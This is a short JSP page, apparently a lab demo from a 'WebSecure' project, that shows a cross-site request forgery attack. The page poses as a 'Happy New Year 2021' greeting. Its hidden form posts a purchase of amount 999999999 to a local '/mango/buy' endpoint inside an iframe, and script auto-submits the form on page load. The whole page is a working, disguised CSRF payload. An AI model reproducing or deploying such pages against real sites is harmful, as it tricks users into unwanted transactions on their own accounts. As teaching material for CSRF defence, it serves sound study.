<%@page contentType="text/html" pageEncoding="UTF-8"%>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>CSRF Email</title>
    </head>
    <body>
        Happy New Year 2021
        <iframe style='display:' name='myiframe'></iframe> 
        <form id="myform" class="pure-form" method="post" action="http://127.0.0.1:8080/WebSecure/mango/buy" target='myiframe'>
            <input type="hidden" name="amount" value="999999999" />
            <!--<button type="submit" class="pure-button pure-button-primary">好康的喔~</button>-->
        </form>
        <script>document.getElementById('myform').submit()</script>
    </body>
</html>
